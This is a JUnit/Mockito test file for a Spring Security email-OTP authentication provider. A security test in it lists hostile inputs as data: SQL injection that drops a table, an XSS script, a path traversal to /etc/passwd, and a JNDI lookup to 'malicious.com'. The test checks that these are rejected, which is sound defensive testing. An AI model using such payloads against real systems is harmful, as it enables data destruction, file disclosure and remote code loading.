package br.edu.utfpr.pb.ext.server.auth.otp;

import br.edu.utfpr.pb.ext.server.email.EmailCodeValidationService;
import br.edu.utfpr.pb.ext.server.email.enums.TipoCodigo;
import br.edu.utfpr.pb.ext.server.usuario.UsuarioRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.InjectMocks;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import java.util.Collection;
import java.util.Collections;
import java.util.Optional;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

/**
 * Comprehensive unit tests for EmailOtpAuthenticationProvider
 * Testing Framework: JUnit 5 with Mockito
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("EmailOtpAuthenticationProvider Tests")
class EmailOtpAuthenticationProviderTest {

    @Mock
    private EmailCodeValidationService emailCodeValidationService;

    @Mock
    private UsuarioRepository usuarioRepository;

    @Mock
    private UserDetails userDetails;

    @InjectMocks
    private EmailOtpAuthenticationProvider authenticationProvider;

    private EmailOtpAuthenticationToken validAuthToken;
    private EmailOtpAuthenticationToken invalidAuthToken;
    private final String validEmail = "user@example.com";
    private final String validOtp = "123456";
    private final String invalidOtp = "invalid";

    @BeforeEach
    void setUp() {
        validAuthToken = new EmailOtpAuthenticationToken(validEmail, validOtp);
        invalidAuthToken = new EmailOtpAuthenticationToken(validEmail, invalidOtp);

        // Setup mock UserDetails
        when(userDetails.getUsername()).thenReturn(validEmail);
        when(userDetails.getPassword()).thenReturn("hashedPassword");
        when(userDetails.isEnabled()).thenReturn(true);
        when(userDetails.isAccountNonExpired()).thenReturn(true);
        when(userDetails.isAccountNonLocked()).thenReturn(true);
        when(userDetails.isCredentialsNonExpired()).thenReturn(true);
        when(userDetails.getAuthorities()).thenReturn(Collections.singletonList(new SimpleGrantedAuthority("ROLE_USER")));
    }

    @Nested
    @DisplayName("Successful Authentication Tests")
    class SuccessfulAuthenticationTests {

        @Test
        @DisplayName("Should successfully authenticate with valid email and OTP")
        void shouldAuthenticateWithValidEmailAndOtp() {
            // Given
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(validEmail))
                    .thenReturn(Optional.of(userDetails));

            // When
            Authentication result = authenticationProvider.authenticate(validAuthToken);

            // Then
            assertNotNull(result);
            assertTrue(result.isAuthenticated());
            assertEquals(userDetails, result.getPrincipal());
            assertNull(result.getCredentials());
            assertEquals(userDetails.getAuthorities(), result.getAuthorities());

            verify(emailCodeValidationService).validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp);
            verify(usuarioRepository).findByEmail(validEmail);
        }

        @Test
        @DisplayName("Should authenticate user with complex email format")
        void shouldAuthenticateUserWithComplexEmail() {
            // Given
            String complexEmail = "user+test.email@sub-domain.example-site.com";
            EmailOtpAuthenticationToken complexAuthToken = new EmailOtpAuthenticationToken(complexEmail, validOtp);

            when(emailCodeValidationService.validateCode(complexEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(complexEmail))
                    .thenReturn(Optional.of(userDetails));

            // When
            Authentication result = authenticationProvider.authenticate(complexAuthToken);

            // Then
            assertNotNull(result);
            assertTrue(result.isAuthenticated());
            assertEquals(userDetails, result.getPrincipal());
        }

        @Test
        @DisplayName("Should authenticate with different OTP lengths")
        void shouldAuthenticateWithDifferentOtpLengths() {
            // Given
            String[] otpCodes = {"1234", "123456", "12345678"};

            for (String otp : otpCodes) {
                EmailOtpAuthenticationToken authToken = new EmailOtpAuthenticationToken(validEmail, otp);
                when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, otp))
                        .thenReturn(true);
                when(usuarioRepository.findByEmail(validEmail))
                        .thenReturn(Optional.of(userDetails));

                // When
                Authentication result = authenticationProvider.authenticate(authToken);

                // Then
                assertNotNull(result);
                assertTrue(result.isAuthenticated());
            }
        }

        @Test
        @DisplayName("Should preserve user authorities after authentication")
        void shouldPreserveUserAuthorities() {
            // Given
            Collection<GrantedAuthority> expectedAuthorities = Collections.singletonList(
                    new SimpleGrantedAuthority("ROLE_ADMIN")
            );
            when(userDetails.getAuthorities()).thenReturn(expectedAuthorities);
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(validEmail))
                    .thenReturn(Optional.of(userDetails));

            // When
            Authentication result = authenticationProvider.authenticate(validAuthToken);

            // Then
            assertNotNull(result);
            assertEquals(expectedAuthorities, result.getAuthorities());
        }
    }

    @Nested
    @DisplayName("Authentication Failure Tests")
    class AuthenticationFailureTests {

        @Test
        @DisplayName("Should throw BadCredentialsException for invalid OTP")
        void shouldRejectInvalidOtp() {
            // Given
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, invalidOtp))
                    .thenReturn(false);

            // When & Then
            BadCredentialsException exception = assertThrows(BadCredentialsException.class, () -> {
                authenticationProvider.authenticate(invalidAuthToken);
            });

            assertEquals("Código de verificação inválido ou expirado", exception.getMessage());

            verify(emailCodeValidationService).validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, invalidOtp);
            verify(usuarioRepository, never()).findByEmail(anyString());
        }

        @Test
        @DisplayName("Should throw BadCredentialsException for expired OTP")
        void shouldRejectExpiredOtp() {
            // Given
            String expiredOtp = "999999";
            EmailOtpAuthenticationToken expiredAuthToken = new EmailOtpAuthenticationToken(validEmail, expiredOtp);
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, expiredOtp))
                    .thenReturn(false);

            // When & Then
            BadCredentialsException exception = assertThrows(BadCredentialsException.class, () -> {
                authenticationProvider.authenticate(expiredAuthToken);
            });

            assertEquals("Código de verificação inválido ou expirado", exception.getMessage());
        }

        @Test
        @DisplayName("Should throw UsernameNotFoundException for non-existent user")
        void shouldRejectNonExistentUser() {
            // Given
            String nonExistentEmail = "nonexistent@example.com";
            EmailOtpAuthenticationToken nonExistentAuthToken = new EmailOtpAuthenticationToken(nonExistentEmail, validOtp);

            when(emailCodeValidationService.validateCode(nonExistentEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(nonExistentEmail))
                    .thenReturn(Optional.empty());

            // When & Then
            UsernameNotFoundException exception = assertThrows(UsernameNotFoundException.class, () -> {
                authenticationProvider.authenticate(nonExistentAuthToken);
            });

            assertEquals("Usuário não encontrado", exception.getMessage());

            verify(emailCodeValidationService).validateCode(nonExistentEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp);
            verify(usuarioRepository).findByEmail(nonExistentEmail);
        }

        @Test
        @DisplayName("Should handle null email gracefully")
        void shouldHandleNullEmail() {
            // Given
            EmailOtpAuthenticationToken nullEmailToken = new EmailOtpAuthenticationToken(null, validOtp);

            // When & Then
            assertThrows(Exception.class, () -> {
                authenticationProvider.authenticate(nullEmailToken);
            });
        }

        @Test
        @DisplayName("Should handle null OTP gracefully")
        void shouldHandleNullOtp() {
            // Given
            EmailOtpAuthenticationToken nullOtpToken = new EmailOtpAuthenticationToken(validEmail, null);

            // When & Then
            assertThrows(Exception.class, () -> {
                authenticationProvider.authenticate(nullOtpToken);
            });
        }

        @Test
        @DisplayName("Should handle empty email gracefully")
        void shouldHandleEmptyEmail() {
            // Given
            EmailOtpAuthenticationToken emptyEmailToken = new EmailOtpAuthenticationToken("", validOtp);
            when(emailCodeValidationService.validateCode("", TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(false);

            // When & Then
            assertThrows(BadCredentialsException.class, () -> {
                authenticationProvider.authenticate(emptyEmailToken);
            });
        }

        @Test
        @DisplayName("Should handle empty OTP gracefully")
        void shouldHandleEmptyOtp() {
            // Given
            EmailOtpAuthenticationToken emptyOtpToken = new EmailOtpAuthenticationToken(validEmail, "");
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, ""))
                    .thenReturn(false);

            // When & Then
            assertThrows(BadCredentialsException.class, () -> {
                authenticationProvider.authenticate(emptyOtpToken);
            });
        }

        @Test
        @DisplayName("Should handle malformed email addresses")
        void shouldHandleMalformedEmailAddresses() {
            // Given
            String[] malformedEmails = {
                    "invalid-email",
                    "@domain.com",
                    "user@",
                    "user@domain",
                    "user space@domain.com"
            };

            for (String malformedEmail : malformedEmails) {
                EmailOtpAuthenticationToken malformedToken = new EmailOtpAuthenticationToken(malformedEmail, validOtp);
                when(emailCodeValidationService.validateCode(malformedEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                        .thenReturn(false);

                // When & Then
                assertThrows(BadCredentialsException.class, () -> {
                    authenticationProvider.authenticate(malformedToken);
                }, "Should reject malformed email: " + malformedEmail);
            }
        }
    }

    @Nested
    @DisplayName("Provider Configuration Tests")
    class ProviderConfigurationTests {

        @Test
        @DisplayName("Should support EmailOtpAuthenticationToken")
        void shouldSupportEmailOtpAuthenticationToken() {
            // When & Then
            assertTrue(authenticationProvider.supports(EmailOtpAuthenticationToken.class));
        }

        @Test
        @DisplayName("Should not support UsernamePasswordAuthenticationToken")
        void shouldNotSupportUsernamePasswordAuthenticationToken() {
            // When & Then
            assertFalse(authenticationProvider.supports(UsernamePasswordAuthenticationToken.class));
        }

        @Test
        @DisplayName("Should not support other authentication types")
        void shouldNotSupportOtherAuthenticationTypes() {
            // When & Then
            assertFalse(authenticationProvider.supports(Authentication.class));
            assertFalse(authenticationProvider.supports(Object.class));
        }

        @Test
        @DisplayName("Should handle null class in supports method")
        void shouldHandleNullClassInSupports() {
            // When & Then
            assertFalse(authenticationProvider.supports(null));
        }

        @Test
        @DisplayName("Should handle subclasses of EmailOtpAuthenticationToken")
        void shouldHandleSubclassesOfEmailOtpAuthenticationToken() {
            // Given
            class CustomEmailOtpAuthenticationToken extends EmailOtpAuthenticationToken {
                public CustomEmailOtpAuthenticationToken(Object principal, Object credentials) {
                    super(principal, credentials);
                }
            }

            // When & Then
            assertTrue(authenticationProvider.supports(CustomEmailOtpAuthenticationToken.class));
        }
    }

    @Nested
    @DisplayName("Service Integration Tests")
    class ServiceIntegrationTests {

        @Test
        @DisplayName("Should handle EmailCodeValidationService throwing exception")
        void shouldHandleEmailCodeValidationServiceException() {
            // Given
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenThrow(new RuntimeException("Email service unavailable"));

            // When & Then
            assertThrows(RuntimeException.class, () -> {
                authenticationProvider.authenticate(validAuthToken);
            });

            verify(emailCodeValidationService).validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp);
            verify(usuarioRepository, never()).findByEmail(anyString());
        }

        @Test
        @DisplayName("Should handle UsuarioRepository throwing exception")
        void shouldHandleUsuarioRepositoryException() {
            // Given
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(validEmail))
                    .thenThrow(new RuntimeException("Database connection error"));

            // When & Then
            assertThrows(RuntimeException.class, () -> {
                authenticationProvider.authenticate(validAuthToken);
            });

            verify(emailCodeValidationService).validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp);
            verify(usuarioRepository).findByEmail(validEmail);
        }

        @Test
        @DisplayName("Should use correct TipoCodigo for OTP validation")
        void shouldUseCorrectTipoCodigoForOtpValidation() {
            // Given
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(validEmail))
                    .thenReturn(Optional.of(userDetails));

            // When
            authenticationProvider.authenticate(validAuthToken);

            // Then
            verify(emailCodeValidationService).validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp);
            verify(emailCodeValidationService, never()).validateCode(eq(validEmail), eq(TipoCodigo.OTP_RECUPERACAO_SENHA), anyString());
        }
    }

    @Nested
    @DisplayName("Edge Case Tests")
    class EdgeCaseTests {

        @Test
        @DisplayName("Should handle very long email addresses")
        void shouldHandleVeryLongEmailAddresses() {
            // Given
            String longEmail = "a".repeat(100) + "@" + "b".repeat(100) + ".com";
            EmailOtpAuthenticationToken longEmailToken = new EmailOtpAuthenticationToken(longEmail, validOtp);

            when(emailCodeValidationService.validateCode(longEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(longEmail))
                    .thenReturn(Optional.of(userDetails));

            // When & Then
            assertDoesNotThrow(() -> {
                Authentication result = authenticationProvider.authenticate(longEmailToken);
                assertNotNull(result);
                assertTrue(result.isAuthenticated());
            });
        }

        @Test
        @DisplayName("Should handle very long OTP codes")
        void shouldHandleVeryLongOtpCodes() {
            // Given
            String longOtp = "1234567890".repeat(10);
            EmailOtpAuthenticationToken longOtpToken = new EmailOtpAuthenticationToken(validEmail, longOtp);

            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, longOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(validEmail))
                    .thenReturn(Optional.of(userDetails));

            // When & Then
            assertDoesNotThrow(() -> {
                Authentication result = authenticationProvider.authenticate(longOtpToken);
                assertNotNull(result);
                assertTrue(result.isAuthenticated());
            });
        }

        @Test
        @DisplayName("Should handle special characters in OTP")
        void shouldHandleSpecialCharactersInOtp() {
            // Given
            String[] specialOtps = {"!@#$%^", "αβγδεζ", "123-456", "12.34.56"};

            for (String specialOtp : specialOtps) {
                EmailOtpAuthenticationToken specialToken = new EmailOtpAuthenticationToken(validEmail, specialOtp);
                when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, specialOtp))
                        .thenReturn(true);
                when(usuarioRepository.findByEmail(validEmail))
                        .thenReturn(Optional.of(userDetails));

                // When & Then
                assertDoesNotThrow(() -> {
                    Authentication result = authenticationProvider.authenticate(specialToken);
                    assertNotNull(result);
                    assertTrue(result.isAuthenticated());
                }, "Should handle special OTP: " + specialOtp);
            }
        }

        @Test
        @DisplayName("Should handle email case sensitivity correctly")
        void shouldHandleEmailCaseSensitivityCorrectly() {
            // Given
            String[] emailVariants = {
                    "User@Example.Com",
                    "USER@EXAMPLE.COM",
                    "user@example.com",
                    "UsEr@ExAmPlE.cOm"
            };

            for (String emailVariant : emailVariants) {
                EmailOtpAuthenticationToken variantToken = new EmailOtpAuthenticationToken(emailVariant, validOtp);
                when(emailCodeValidationService.validateCode(emailVariant, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                        .thenReturn(true);
                when(usuarioRepository.findByEmail(emailVariant))
                        .thenReturn(Optional.of(userDetails));

                // When & Then
                assertDoesNotThrow(() -> {
                    Authentication result = authenticationProvider.authenticate(variantToken);
                    assertNotNull(result);
                    assertTrue(result.isAuthenticated());
                }, "Should handle email variant: " + emailVariant);
            }
        }
    }

    @Nested
    @DisplayName("Security Tests")
    class SecurityTests {

        @Test
        @DisplayName("Should not expose sensitive information in exceptions")
        void shouldNotExposeSensitiveInformationInExceptions() {
            // Given
            String sensitiveOtp = "secret123";
            EmailOtpAuthenticationToken sensitiveToken = new EmailOtpAuthenticationToken(validEmail, sensitiveOtp);
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, sensitiveOtp))
                    .thenReturn(false);

            // When
            BadCredentialsException exception = assertThrows(BadCredentialsException.class, () -> {
                authenticationProvider.authenticate(sensitiveToken);
            });

            // Then
            String message = exception.getMessage();
            assertFalse(message.contains(sensitiveOtp), "Exception should not contain the OTP");
            assertFalse(message.contains("secret"), "Exception should not contain sensitive details");
            assertEquals("Código de verificação inválido ou expirado", message);
        }

        @Test
        @DisplayName("Should clear credentials in successful authentication")
        void shouldClearCredentialsInSuccessfulAuthentication() {
            // Given
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(validEmail))
                    .thenReturn(Optional.of(userDetails));

            // When
            Authentication result = authenticationProvider.authenticate(validAuthToken);

            // Then
            assertNotNull(result);
            assertTrue(result.isAuthenticated());
            assertNull(result.getCredentials()); // Credentials should be cleared for security
        }

        @Test
        @DisplayName("Should validate inputs to prevent injection attacks")
        void shouldValidateInputsToPreventInjectionAttacks() {
            // Given
            String[] maliciousInputs = {
                    "'; DROP TABLE users; --",
                    "<script>alert('xss')</script>",
                    "../../etc/passwd",
                    "${jndi:ldap://malicious.com}"
            };

            for (String maliciousInput : maliciousInputs) {
                EmailOtpAuthenticationToken maliciousEmailToken = new EmailOtpAuthenticationToken(maliciousInput, validOtp);
                EmailOtpAuthenticationToken maliciousOtpToken = new EmailOtpAuthenticationToken(validEmail, maliciousInput);

                when(emailCodeValidationService.validateCode(anyString(), eq(TipoCodigo.OTP_AUTENTICACAO), anyString()))
                        .thenReturn(false);

                // When & Then
                assertThrows(BadCredentialsException.class, () -> {
                    authenticationProvider.authenticate(maliciousEmailToken);
                }, "Should reject malicious email input: " + maliciousInput);

                assertThrows(BadCredentialsException.class, () -> {
                    authenticationProvider.authenticate(maliciousOtpToken);
                }, "Should reject malicious OTP input: " + maliciousInput);
            }
        }
    }

    @Nested
    @DisplayName("Performance Tests")
    class PerformanceTests {

        @Test
        @DisplayName("Should handle multiple concurrent authentication requests")
        void shouldHandleConcurrentAuthentications() throws InterruptedException {
            // Given
            int threadCount = 10;
            int requestsPerThread = 5;
            CountDownLatch latch = new CountDownLatch(threadCount);
            AtomicInteger successCount = new AtomicInteger(0);
            AtomicInteger failureCount = new AtomicInteger(0);

            when(emailCodeValidationService.validateCode(anyString(), eq(TipoCodigo.OTP_AUTENTICACAO), anyString()))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(anyString()))
                    .thenReturn(Optional.of(userDetails));

            // When
            for (int i = 0; i < threadCount; i++) {
                final int threadId = i;
                new Thread(() -> {
                    try {
                        for (int j = 0; j < requestsPerThread; j++) {
                            String email = "user" + threadId + "@example.com";
                            String otp = "12345" + j;
                            EmailOtpAuthenticationToken authToken = new EmailOtpAuthenticationToken(email, otp);

                            try {
                                Authentication result = authenticationProvider.authenticate(authToken);
                                if (result.isAuthenticated()) {
                                    successCount.incrementAndGet();
                                }
                            } catch (Exception e) {
                                failureCount.incrementAndGet();
                            }
                        }
                    } finally {
                        latch.countDown();
                    }
                }).start();
            }

            // Then
            assertTrue(latch.await(10, TimeUnit.SECONDS));
            assertEquals(threadCount * requestsPerThread, successCount.get());
            assertEquals(0, failureCount.get());
        }

        @Test
        @DisplayName("Should perform authentication within reasonable time limits")
        void shouldPerformWithinTimeLimit() {
            // Given
            when(emailCodeValidationService.validateCode(validEmail, TipoCodigo.OTP_AUTENTICACAO, validOtp))
                    .thenReturn(true);
            when(usuarioRepository.findByEmail(validEmail))
                    .thenReturn(Optional.of(userDetails));

            // When
            long startTime = System.currentTimeMillis();
            Authentication result = authenticationProvider.authenticate(validAuthToken);
            long endTime = System.currentTimeMillis();

            // Then
            assertNotNull(result);
            assertTrue(result.isAuthenticated());
            assertTrue((endTime - startTime) < 1000, "Authentication should complete within 1 second");
        }
    }
}